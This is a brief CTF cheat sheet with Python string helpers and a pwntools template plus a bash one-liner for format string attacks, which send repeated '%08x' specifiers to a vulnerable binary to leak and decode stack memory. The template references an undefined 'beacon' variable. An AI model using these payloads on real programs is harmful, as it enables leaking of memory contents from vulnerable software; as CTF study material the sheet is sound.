# CTF Tricks

## Tech Tricks (cheat sheet)

### C (lang)

The format string to `printf` a byte without missing any _"0"_ is: `%08x`

### Python 3

Split string *(sample)* in octets of 8

```python
[ sample[i:i+8] for i in range(0, len(sample), 8) ]
```

Reverse a python string *(sample)*

```python
sample[::-1]
```

Decode an valid hex string *(sample)*

```python
bytes.fromhex(sample).decode()
```

### Pnwtools

Template classique pour un exploit de format string

```python
#!/bin/python

from pwn import *

#conn = remote('chall.ctf.net', 27912)
conn = process('./a.out')

payload = "1" + beacon + "%08x" * 30

conn.sendline(payload)

line = ""
while not beacon in line:
    line = conn.recvline().decode()

extract = line[len(beacon):]

for octets in [ extract[i:i+8] for i in range(0, len(extract), 8) ]:
  try :
    print(octets, "-", bytes.fromhex(octets).decode()[::-1])
  except :
    print(octets, "✖")
```

## Applied

### Format string injection

The following payload can be modified to export as many bytes as necessary /
possible:

```bash
python -c 'print("1"+"%08x"*100)' | ./vulnerable
```

Then the output can be decoded with:

```python
for b in [ extract[i:i+8] for i in range(0, len(extract), 8) ]:
  try :
    print(b, "-", bytes.fromhex(b).decode()[::-1])
  except :
    print(b, "✖")
```
